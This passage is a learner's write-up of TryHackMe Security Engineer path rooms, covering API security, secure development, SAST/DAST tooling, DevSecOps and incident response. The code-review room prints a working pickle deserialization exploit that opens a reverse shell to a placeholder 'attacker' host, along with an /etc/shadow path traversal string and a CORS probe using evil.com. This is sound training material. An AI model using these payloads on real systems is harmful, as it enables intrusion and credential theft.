- **API8 Security Misconfiguration**: wildcard CORS, default API keys, debug mode in production, verbose errors
- **API9 Improper Inventory Management**: deprecated API versions still live, shadow APIs, no lifecycle management
- **API10 Unsafe Consumption**: trusting third-party API responses without validation

**What I did:**
Exploited CORS wildcard on an authenticated API — demonstrated cross-origin credential reading. Discovered `/api/v2/` returning raw database records via brute-force. Tested default API key (`X-API-Key: test`) — accepted in production on the admin endpoint.

```bash
# CORS check
curl -H "Origin: http://evil.com" -v https://api.target.thm/api/v1/me 2>&1 | grep "Access-Control"

# API version discovery
gobuster dir -u https://api.target.thm -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
# Also try: /v1/ /v2/ /v3/ /beta/ /dev/ /internal/ /legacy/
```

**Takeaways:**
`Access-Control-Allow-Origin: *` on an authenticated API lets any website read authenticated responses — critical misconfiguration. API versioning without retiring old versions means vulnerabilities "fixed" in v2 still exist in v1. Shadow APIs found via brute-forcing often predate any security review and expose raw data with no access controls.

---

### Room 21 — SSDLC
🔗 https://tryhackme.com/room/securesdlc

**Key Concepts:**
- SSDLC: integrate security at every SDLC phase rather than testing at the end
- Security activities by phase: abuse cases (Requirements), threat modelling (Design), secure code review/SCA (Development), SAST/DAST/pentest (Testing), hardened config (Deployment), patch management (Maintenance)
- Shift Left: move security earlier — exponentially cheaper than post-production remediation
- Security Champions: developers with security training embedded in each team — scales security review

**What I did:**
Mapped a full SSDLC for a web application. Wrote abuse cases alongside use cases during requirements. Created a threat model during design — caught two trust boundary violations that would have been expensive to fix post-development. Specified SAST + SCA gates for pull requests.

**Takeaways:**
IBM research (cited by NIST) shows vulnerabilities cost ~6× more to fix in testing than design, and ~30× more in production than design. A 30-minute threat model session preventing an architectural flaw saves weeks of post-production remediation. Security requirements written alongside functional requirements give developers clarity about what "secure" means for each user story.

---

### Room 22 — SAST
🔗 https://tryhackme.com/room/sast

**Key Concepts:**
- SAST: analyse source code without executing — finds vulnerabilities at the code level
- Advantages: runs pre-commit in CI/CD, no running app needed, full theoretical coverage
- Limitations: high false positive rate (~30–40%), does not catch runtime/logic issues
- Tools: Semgrep (multi-language, free), Bandit (Python), ESLint security plugins (JS), Brakeman (Rails)
- Common findings: SQL injection via string concat, command injection, hardcoded secrets, insecure random, weak crypto
- CI/CD integration: block PRs on critical findings — treat as build failures

**What I did:**
Ran Semgrep (OWASP Top 10 ruleset) and Bandit against a vulnerable Flask app. Found: hardcoded database password, SQL query built with f-string (injection), `subprocess.call(shell=True)` on user input (command injection), `hashlib.md5()` for passwords, `random.random()` for session tokens.

```bash
# Semgrep
semgrep --config=p/python --config=p/owasp-top-ten --config=p/secrets /path/to/code

# Bandit
bandit -r ./app/ -f json -o results.json -l

# Manual secret search
grep -rn "password\s*=\s*['\"]" --include="*.py" .
grep -rn "AKIA[0-9A-Z]{16}" . -l    # AWS access key pattern
```

**Takeaways:**
Semgrep with OWASP Top 10 rules finds the most critical code patterns in minutes. The challenge is false positive management — developers who receive 50 low-confidence findings per PR develop alert fatigue immediately. Start with high-confidence, high-severity rules only and expand incrementally.

---

### Room 23 — DAST
🔗 https://tryhackme.com/room/dast

**Key Concepts:**
- DAST: test a running application by sending requests — finds runtime vulnerabilities SAST misses
- Advantages: tests actual behaviour, lower false positive rate, catches configuration issues
- Limitations: requires running app, may miss code paths, slower than SAST
- Tools: OWASP ZAP (free), Burp Suite Scanner (professional), Nikto
- Passive vs active: passive = observe only, active = send attack payloads — only run active on staging
- CI/CD integration: ZAP baseline (passive) is safe against staging; full scan blocks promotion on criticals

**What I did:**
Ran OWASP ZAP in active scan mode against a staging application with authentication configured. Found: reflected XSS in search parameter, SQL injection in filter parameter, missing CSP header, X-Frame-Options not set. Ran Nikto — identified version disclosure in Server header and directory listing on `/uploads/`.

```bash
# ZAP baseline (passive, CI-safe)
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://staging.target.thm -r report.html

# ZAP full active scan
docker run -t owasp/zap2docker-stable zap-full-scan.py -t http://staging.target.thm -r full_report.html

# Nikto
nikto -h http://target.thm -o results.txt
```

**Takeaways:**
DAST and SAST complement each other — SAST catches code-level patterns, DAST catches runtime and configuration issues. Neither replaces a manual penetration test for context-dependent vulnerabilities. The ZAP baseline scan (passive) is safe on production; the full active scan belongs in the staging pipeline only.

---

### Room 24 — Weaponizing Vulnerabilities
🔗 https://tryhackme.com/room/weaponizingvulnerabilities

**Key Concepts:**
- Exploitation maturity: theoretical → PoC published → weaponised (reliable exploit) → integrated (Metasploit module)
- EPSS: exploitation probability metric — supplements CVSS with real-world likelihood data
- Exploit chain: initial foothold + privilege escalation + lateral movement + persistence
- Always read PoC code before running — unvetted exploit code frequently contains malware

**What I did:**
Traced the full exploitation lifecycle for a real CVE — advisory → NVD → ExploitDB → PoC review → lab exploitation. Applied EPSS alongside CVSS to a list of CVEs — reprioritised the remediation backlog based on actual exploitation likelihood rather than theoretical severity.

**Takeaways:**
CVSS alone is misleading for prioritisation — a CVSS 9.8 with no public exploit on an internal system is lower priority than a CVSS 6.5 with a Metasploit module actively exploited in the wild. EPSS gives the missing probability dimension. Always vet exploit code before execution — blind trust in PoC scripts from untrusted sources is a supply chain attack waiting to happen.

---

### Room 25 — Introduction to DevSecOps
🔗 https://tryhackme.com/room/introductiontodevsecops

**Key Concepts:**
- DevSecOps: security integrated into every DevOps pipeline stage — "security as code"
- Pipeline security: pre-commit (secret scanning, fast SAST) → build (SCA, image scan) → test (full SAST, DAST) → deploy (IaC scan) → operate (runtime monitoring)
- SCA: scan third-party dependencies — `npm audit`, `pip-audit`, OWASP Dependency-Check, Snyk
- Secret scanning: `truffleHog`, `detect-secrets` — prevent credentials entering version control
- IaC scanning: `tfsec`, `checkov`, `terrascan` — find Terraform/CloudFormation misconfigurations before apply

**What I did:**
Integrated a full DevSecOps pipeline for a Node.js application — pre-commit hooks with `detect-secrets`, PR gate with Semgrep and `npm audit`, build with Trivy image scan, staging with ZAP baseline. Scanned Terraform with `tfsec` — found S3 buckets without encryption, security groups with `0.0.0.0/0`, no VPC flow logs.

```bash
# Secret scanning pre-commit
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline

# SCA
npm audit --audit-level=high
pip-audit --requirement requirements.txt

# IaC scanning
checkov -d ./terraform/ --framework terraform
tfsec ./terraform/ --format json

# Container image in CI
trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:${CI_COMMIT_SHA}
```

**Takeaways:**
Pre-commit secret scanning is the most impactful control for development teams — credentials that never enter version control can never be exfiltrated. Even after deletion, secrets in git history are recoverable. `checkov` against Terraform before `terraform apply` is SAST for infrastructure — it catches public S3 buckets and open security groups before they exist.

---

### Room 26 — Mother's Secret
🔗 https://tryhackme.com/room/codeanalysis

**Key Concepts:**
- Capstone: manual code review and vulnerability exploitation without automated tools
- Methodology: trace user-controlled data from input through processing to dangerous sinks
- Dangerous sinks: database queries, OS command execution, file operations, deserialization, template rendering

**What I did:**
Reviewed a multi-file Python Flask application manually. Found: hardcoded admin password in `config.py`, insecure deserialization in a cookie handler (`pickle.loads()` on user-supplied data), and path traversal in a file download endpoint. Exploited the pickle deserialization to get RCE and retrieve the flag.

```python
# Vulnerability: insecure deserialization
@app.route('/profile')
def profile():
    data = request.cookies.get('session')
    user = pickle.loads(base64.b64decode(data))   # NEVER deserialize user input

# Exploit: craft malicious pickle object
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
# Set as cookie value → server deserializes → RCE

# Path traversal
# /download?file=../../etc/shadow
```

**Takeaways:**
`pickle.loads()` on user-controlled data executes arbitrary Python code embedded in the object — it is equivalent to `eval()` for serialized data. This applies to Java `ObjectInputStream`, PHP `unserialize()`, and Ruby `Marshal.load()` — never deserialize untrusted data with these mechanisms. Manual code review finds what automated tools miss — particularly insecure deserialization and context-dependent path traversal.

---

---

## Section 5 — Managing Incidents

> Goal: Incident response, logging for accountability, first response, and cyber crisis management.

---

### Room 27 — Intro to IR and IM
🔗 https://tryhackme.com/room/introtoirandim

**Key Concepts:**
- IR (Incident Response): structured technical response — contain, eradicate, recover
- IM (Incident Management): broader coordination — communication, escalation, business continuity
- NIST IR lifecycle: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned
- Incident severity: Critical (business-stopping, ransomware, data breach), High, Medium, Low
- IR playbooks: pre-written, tested response procedures for specific incident types
- RACI matrix: Responsible, Accountable, Consulted, Informed — defines roles during an incident
- Tabletop exercises: simulated walkthroughs — build muscle memory before the real event

**What I did:**
Followed an IR playbook for a simulated ransomware incident — scoped the infection (3 systems), isolated affected machines, preserved evidence (memory dumps before remediation), identified the access vector (phishing email with malicious .docm), identified persistence (scheduled task), eradicated malware, restored from clean backups, and conducted a post-incident review identifying the gap (no macro policy in Office).

**Takeaways:**
Organisations that recover from ransomware in hours vs weeks differ almost entirely in preparation — tested backups, documented playbooks, rehearsed teams. Containment before eradication is non-negotiable — eradicating on one machine while the attacker has persistence on another means re-infection within minutes. Evidence preservation before remediation is required for forensic investigation and insurance claims.

---

### Room 28 — Logging for Accountability
🔗 https://tryhackme.com/room/loggingforaccountability

**Key Concepts:**
- Accountability: logs prove a specific identity performed a specific action at a specific time
- Log integrity: logs stored only locally can be deleted by root-level attackers — forward to remote syslog immediately
- Immutable storage: WORM (Write Once Read Many) — logs cannot be altered retroactively
- What to log: authentication events, privilege escalation, config changes, data access, network connections, API calls
- Structured logging: JSON format enables machine parsing and SIEM ingestion
- Log retention: PCI-DSS requires 1 year (3 months online), GDPR requires no longer than necessary
- NTP: synchronised clocks across all systems — essential for log correlation

**What I did:**
Configured centralised syslog from Linux servers and Windows Event Forwarding. Enabled structured JSON logging in an application. Demonstrated that without remote forwarding, an attacker deleting `/var/log/auth.log` destroys all evidence — with remote syslog, every event is preserved off-system before deletion occurs.

```bash
# Linux rsyslog forwarding
echo "*.* @@192.168.100.50:514" >> /etc/rsyslog.conf
systemctl restart rsyslog

# auditd accountability rules
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_exec
auditctl -w /etc/sudoers -p wa -k sudoers_mod
auditctl -w /var/log -p wa -k log_tampering

# Verify NTP sync
timedatectl status && chronyc tracking | grep "System time"
```

**Takeaways:**
Remote centralised logging is non-negotiable — logs that only exist on the compromised host will be deleted. MITRE ATT&CK T1070 (Indicator Removal) specifically covers log deletion, and it is standard attacker tradecraft after reaching root. Immutable centralised logs survive T1070; local logs do not. Log integrity is as important as log completeness.

---

### Room 29 — Becoming a First Responder
🔗 https://tryhackme.com/room/becomingafirstresponder

**Key Concepts:**
- First responder: first technical person to arrive — their actions determine what evidence survives or is lost
- Core objectives in order: preserve evidence → determine scope → contain spread
- Volatile data collection order (RFC 3227): RAM → running processes → network connections → open files → disk
- Do not reboot: destroys all volatile evidence — single most destructive first responder action
- Memory forensics: RAM contains malware, decryption keys, attacker tools, network credentials — exists nowhere else
- Chain of custody: document every action with timestamp, actor, justification

**What I did:**
Responded to a simulated compromise — unusual outbound connections and a suspicious process. Documented initial state before touching anything, captured memory with `avml`, recorded all network connections and running processes, identified the malicious process (reverse shell disguised as `[kworker]`) and its parent (compromised web process), notified incident manager before taking any containment action.

```bash
# Document initial state
date && hostname && uname -a > /tmp/ir_$(date +%Y%m%d_%H%M%S).txt

# Volatile data collection (order matters)
ps auxf --forest > /evidence/processes.txt
ss -tulnp > /evidence/connections.txt
w > /evidence/users.txt
last -n 50 > /evidence/login_history.txt
lsof -n > /evidence/open_files.txt

# Memory dump (highest priority — before anything else)
sudo ./avml /evidence/memory_$(date +%Y%m%d_%H%M%S).lime

# Disk image (last — least volatile)
dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
sha256sum /evidence/disk.img > /evidence/disk.img.sha256

# Hash all evidence
sha256sum /evidence/* > /evidence/hashes.txt
```

**Takeaways:**
First responders who reboot before collecting evidence destroy the most valuable forensic data — RAM contains running malware, decryption keys, and attacker tooling that exist nowhere on disk. The chain of custody starts the moment you touch the system — every command run must be documented. A well-executed first response enables full incident reconstruction; a poor one leaves "we know something bad happened but not what."

---

### Room 30 — Cyber Crisis Management
🔗 https://tryhackme.com/room/cybercrisismanagement

**Key Concepts:**
- Cyber crisis: incident threatening business continuity, reputation, or legal standing at organisational scale
- Crisis management vs IR: IR is technical (contain/eradicate/recover), crisis management is organisational (communicate/decide/continuity)
- Crisis Management Team: CISO, CEO/COO, Legal, PR/Comms, HR, Finance — not just technical staff
- Regulatory notifications: GDPR 72 hours for personal data breaches, US SEC 4 business days for material incidents
- Business Continuity Plan (BCP): keeps essential operations running during the crisis — manual fallbacks, alternative sites
- Disaster Recovery Plan (DRP): restores IT systems — RTO (Recovery Time Objective), RPO (Recovery Point Objective)
- Post-crisis review: root cause analysis and lessons learned — within 2 weeks of recovery

**What I did:**
Managed a simulated large-scale ransomware crisis — 40% of servers encrypted, backups partially affected. Activated crisis management team, executed communication plan, notified data protection authority within 72-hour GDPR window, activated BCP to maintain customer-facing services on unaffected infrastructure, coordinated DRP to restore from previous day's offsite backup. Post-crisis review identified three control gaps: no Office macro policy, backups not isolated from the main network, incomplete EDR coverage.

**Takeaways:**
The organisations that recover fastest from ransomware are those with tested isolated backups, pre-written communication templates, and a rehearsed escalation chain — not those with the best perimeter security. Crisis management is a business function, not an IT function — the CISO's role is to advise the business, not manage the crisis independently. Pre-drafted regulatory notification templates mean 72-hour GDPR deadlines are achievable even under extreme pressure.

---

### Rooms 31–33 — Additional Rooms
*Complete the notes below as you work through the remaining rooms to reach the full path total:*

---

### Room 31 — *(Add room name)*
🔗 <!-- URL -->

**Key Concepts:**
- 

**What I did:**


**Takeaways:**


---

### Room 32 — *(Add room name)*
🔗 <!-- URL -->

**Key Concepts:**
- 

**What I did:**


**Takeaways:**


---

### Room 33 — *(Add room name)*
🔗 <!-- URL -->

**Key Concepts:**
- 

**What I did:**


**Takeaways:**


---

---

## Path-Level Reflection

### What I learned overall
The Security Engineer path is the most comprehensive defensive path on TryHackMe. The software security section (SSDLC, SAST, DAST, DevSecOps) is unique — none of the other paths cover secure development practices at this depth. The hardening sections (Linux, Windows, AD, network devices) are the practical complement to the privilege escalation techniques learned in Jr Pen Tester — understanding how to escalate tells you exactly what to harden. Governance and risk management give security work a business context that makes it fundable and actionable.

### What connected across sections
Threat modelling (Section 2) feeds directly into secure architecture design (Section 3) — you cannot design a secure network without first mapping what threats it needs to resist. SAST and DAST in Section 4 are the defensive answers to SQL injection and command injection exploited offensively in Jr Pen Tester. Active Directory hardening counters Kerberoasting and Pass-the-Hash learned in offensive paths — the offensive technique tells you exactly what the defensive control must prevent.

### What this path adds vs offensive paths
- Governance and compliance — regulatory frameworks not covered offensively
- SSDLC — security in the development process — unique to this path
- Risk management — quantifying and communicating risk in business terms
- Crisis management — organisational response at scale
- Secure architecture design — building systems to resist attack, not just attacking them
- CSPM and DevSecOps tooling — the cloud and pipeline defender's toolkit

---

*Writeup by [gresium](https://tryhackme.com/p/gresium) | TryHackMe — Security Engineer Path*
